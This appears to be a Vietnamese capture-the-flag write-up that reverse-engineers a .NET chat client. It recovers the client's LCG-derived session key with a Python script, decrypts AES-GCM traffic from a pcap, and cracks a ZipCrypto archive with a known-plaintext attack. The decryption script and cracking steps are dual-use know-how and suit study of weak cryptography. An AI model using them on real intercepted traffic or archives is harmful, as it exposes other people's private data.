File `client.zip` sau extract gồm:
```
client_cs.dll:                PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
client_cs.exe:                PE32+ executable (console) x86-64, for MS Windows
client_cs.runtimeconfig.json: JSON data
instruction.txt:              ASCII text, with no line terminators
```
File `instruction.txt` có nội dùng: `contact me at 192.168.247.1:9000`. 
Em dùng `dnspy` để phân tích file `client_cs.dll`
![image](/images/wannagame-cyberknight-2026/HkLn1HSKzg.png)
Hàm `main`
```csharp
// Client.Program
// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
private static void Main(string[] args)
{
	Program.<>c__DisplayClass0_0 CS$<>8__locals1 = new Program.<>c__DisplayClass0_0();
	Console.Write("Enter your username: ");
	Program.<>c__DisplayClass0_0 CS$<>8__locals2 = CS$<>8__locals1;
	string text = Console.ReadLine();
	CS$<>8__locals2.username = ((text != null) ? text.Trim() : null);
	if (string.IsNullOrEmpty(CS$<>8__locals1.username))
	{
		CS$<>8__locals1.username = "anonymous";
	}
	Console.Write("Server: ");
	string text2 = Console.ReadLine();
	string text3 = (text2 != null) ? text2.Trim() : null;
	Console.Write("Port: ");
	string text4 = Console.ReadLine();
	int num;
	if (!int.TryParse((text4 != null) ? text4.Trim() : null, out num))
	{
		Console.WriteLine("Invalid port.");
		return;
	}
	try
	{
		using (TcpClient tcpClient = new TcpClient())
		{
			if (text3 != null)
			{
				tcpClient.Connect(text3, num);
				DefaultInterpolatedStringHandler defaultInterpolatedStringHandler = new DefaultInterpolatedStringHandler(14, 2);
				defaultInterpolatedStringHandler.AppendLiteral("Connected to ");
				defaultInterpolatedStringHandler.AppendFormatted(text3);
				defaultInterpolatedStringHandler.AppendLiteral(":");
				defaultInterpolatedStringHandler.AppendFormatted<int>(num);
				Console.WriteLine(defaultInterpolatedStringHandler.ToStringAndClear());
				CS$<>8__locals1.stream = tcpClient.GetStream();
				byte[] array = new byte[8];
				RandomNumberGenerator.Fill(array);
				CS$<>8__locals1.stream.Write(array, 0, array.Length);
				byte[] array2 = new byte[8];
				Program.ReadFull(CS$<>8__locals1.stream, array2);
				byte[] array3 = new byte[8];
				for (int i = 0; i < 8; i++)
				{
					array3[i] = (array[i] ^ array2[i]);
				}
				if (BitConverter.IsLittleEndian)
				{
					Array.Reverse<byte>(array3);
				}
				ulong seed = BitConverter.ToUInt64(array3, 0);
				byte[] array4 = new byte[32];
				RandomNumberGenerator.Fill(array4);
				CS$<>8__locals1.sessionKey = SHA256.HashData(array4);
				byte[] data = Program.EncryptECB(Program.GenerateECBKey(seed), CS$<>8__locals1.sessionKey);
				Program.WriteMessage(CS$<>8__locals1.stream, data);
				byte[] bytes = Program.ReadMessage(CS$<>8__locals1.stream);
				if (Encoding.UTF8.GetString(bytes) != "OK")
				{
					Console.WriteLine("Expected OK, got: " + Encoding.UTF8.GetString(bytes));
				}
				else
				{
					new Thread(delegate()
					{
						Program.ReceiveLoop(CS$<>8__locals1.stream, CS$<>8__locals1.sessionKey, CS$<>8__locals1.username);
					})
					{
						IsBackground = true
					}.Start();
					for (;;)
					{
						Console.Write("[" + CS$<>8__locals1.username + "]: ");
						string text5 = Console.ReadLine();
						if (text5 == null)
						{
							break;
						}
						text5 = text5.Trim();
						if (!string.IsNullOrEmpty(text5))
						{
							byte[] plaintext;
							if (text5.StartsWith("/file "))
							{
								string path = text5.Substring(6).Trim();
								try
								{
									plaintext = File.ReadAllBytes(path);
									goto IL_2A2;
								}
								catch (Exception ex)
								{
									Console.WriteLine("Error reading file: " + ex.Message);
									continue;
								}
								goto IL_284;
							}
							goto IL_284;
							IL_2A2:
							byte[] data2 = Program.EncryptGCM(CS$<>8__locals1.sessionKey, plaintext);
							Program.WriteMessage(CS$<>8__locals1.stream, data2);
							continue;
							IL_284:
							plaintext = Encoding.UTF8.GetBytes(CS$<>8__locals1.username + ": " + text5);
							goto IL_2A2;
						}
					}
				}
			}
		}
	}
	catch (Exception ex2)
	{
		Console.WriteLine("Connection error: " + ex2.Message);
	}
}

```
Đây là một chương trình dùng để giao tiếp qua TCP có cơ chế mã hóa:
- Handshake: client tạo ngẫu nhiên mảng 8 bytes `array` và nhận mảng 8 bytes`array2` từ server và dùng nó để tạo ra `seed`. `array3 = array ^ array2` và `seed = UInt64(array3)`
- Tạo ngẫu nhiên mảng 32 bytes và lấy hash sha256 để làm `sessionkey`
- `sessionkey` được mã hóa bằng `EncryptECB(GenerateECBKey(seed), sessionKey)` và gửi đến server.![image](/images/wannagame-cyberknight-2026/r1JRr9SKfx.png)
- Dữ liệu truyền đi được mã hóa AES-GCM với key là `sessionkey`; iv(12byte)|cipher|tag(16 bytes)![image](/images/wannagame-cyberknight-2026/HkNLI5Stze.png)

![image](/images/wannagame-cyberknight-2026/Synp49SYfe.png)
Từ đó ta có `array`, `array2` và `encrypted sessionkey` và dùng script sau để giải mã:
```python
from Crypto.Cipher import AES

A = 1103515245
C = 12345
MOD = 2**31


def generate_ecb_key(seed):
    num = seed
    key = bytearray()
    for _ in range(16):
        num = (A * num + C) % MOD
        key.append((num >> 16) & 0xff)
    return bytes(key)


def derive_session_key(client_random, server_random, encrypted_session_key):
    x = bytes(a ^ b for a, b in zip(client_random, server_random))
    seed = int.from_bytes(x, "big")
    ecb_key = generate_ecb_key(seed)
    cipher = AES.new(ecb_key, AES.MODE_ECB)
    session_key = cipher.decrypt(encrypted_session_key)
    return session_key


def decrypt_gcm(session_key, payload):
    nonce = payload[:12]
    ciphertext = payload[12:-16]
    tag = payload[-16:]
    cipher = AES.new(session_key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

client_random = bytes.fromhex("44ad838a9c5b6a8e")

server_random = bytes.fromhex("15f4c24b7bb9a73f")

encrypted_session_key = bytes.fromhex("9738cd8617b997255230ef47b7b4aa5af3cb4c0c31052f8ff11cdd930315d1fb")

session_key = derive_session_key(client_random, server_random, encrypted_session_key)

with open("communication.txt", "r") as file:
    for line in file:
        line = line.strip()
        if not line: continue
        gcm_payload = bytes.fromhex(line)
        plaintext = decrypt_gcm(session_key,gcm_payload)
        print(plaintext.decode("utf-8", errors="replace"))

```
Parse cuộc hội thoại 
```
$ tshark -r challenge.pcapng -Y "ip.addr == 192.168.247.1&&ip.addr == 192.168.247.152&&frame.len > 86&&frame.len < 500" -T fields -e data.data
271c3444c1056e0a5ba913e126b465994919ff56f6f00aeaedb0b8fd76abe65b37e28e981d
68c3f33b4dd198bd12a21407667a85579ea62dc5f7847ebd498cde6c7f7ccab6628de54393
3468451bb71bed55c1fb1f67c5852c8c220812e369bba1b684d402cbee67b458805efa0be4236e1e0caa0954b3b6dffc58d5cc25ba5d5eaf
80e6e2fd9dd7c998494c24956aac218497ec0442fc994d8b80a34decd14dd0110e058539121a5d
b27022ba27b076d0ad2f5a97de43e07113dc5da587f6db7dd3e2857c0df0aeb8fe2d73c68df171245cbb643a4153d600ba5988425368afbe76
50902028443c47df3d87c26e0ad7ad5386ad9c4b431449a164ae1e420017fb0fc0b8c6342b62af
96d2fc03fcd32ab2c47b8a6d3d58eee9f342656c69076e6cae6a062810039326274e61b5f5f5ffd3d89259a386f9578767be7903
71719c22b78a21f9dc6030da9b9fb184cb652694b1db82fb99e7d252e5c8733833b701de6ba73f6af1eaa4a5a0f6285c3882cf72009280b7f0c0f8d1b4a3de1d79e4f9afde
fd719efb06d53e3fc0f9f58425a8887245818e0521fc00a55d7384a68fed110231f2ab06de9b851053325cf30f641cfcb1d91e746a8b6950adf81a9c8b105a683bd9f8373d
e40646390567ab5df18f50ca2bed41c7f3a55242494ef06313c8650a4d78c9783a288f58301bdc
5bb9d15b778f4a1427a7b3860e377c989c8f5e514fa48583aa2607389e167a219080904305c5bfe0abf24fb4d99e3ca387b5d0d891
c0626002542f60a437dad33fe579c7a360214dae9f3d1d3aed19d7eee8a6e45f979db85a8e36a2e046c598d2024e28836029026898f81f598cc83c4aa48df27d0cb9de64
84f2ce9b2cb5d2893941efc8e2ec15eeac85a3607e8e3f1ae9126bfe2b2bd4a10a99b256d5ce668017fda022951aa639
5b5dc2f276aeabbe9048092c28d472a5092955f0ecfba68e7b9a143eb27dc53dd2f9749a5fd45a113b
e37a82f94786df912080eebb17fb08ed1dc3a6046ac3e1ead6baf0a4731fa5664ffd16a268e9
```

![image](/images/wannagame-cyberknight-2026/Skp655SYzl.png)
Ở giữa là payload lớn sau khi decrypt sẽ được base64, tiếp tục decrypt sẽ được file zip (cần password).
![image](/images/wannagame-cyberknight-2026/BkgXjqSFGl.png)
```
$ tshark -r challenge.pcapng -Y "ip.addr == 192.168.247.1&&ip.addr == 192.168.247.152&&frame.len > 597" -T fields -e data.data
```
![image](/images/wannagame-cyberknight-2026/S1yRj9rtfe.png)
Từ đoạn chat được giải mã em tưởng `password` được giấu đâu đó, nhưng tìm mãi không ra =))).
Sau khi xin hint từ anh author **s3asick5** thì password không được gửi mà phải tìm vulnerability của phương pháp dùng để nén.
Sau khi search gg thì em tìm được vuln plaintext attack https://wiki.anter.dev/misc/plaintext-attack-zipcrypto/#executing-the-plaintext-attack
Làm như hướng dẫn với `plaint.bin` và tìm được flag:
```
00000000: 8950 4e47 0d0a 1a0a 0000 000d            .PNG........
```
![image](/images/wannagame-cyberknight-2026/B1V8CqBtGl.png)
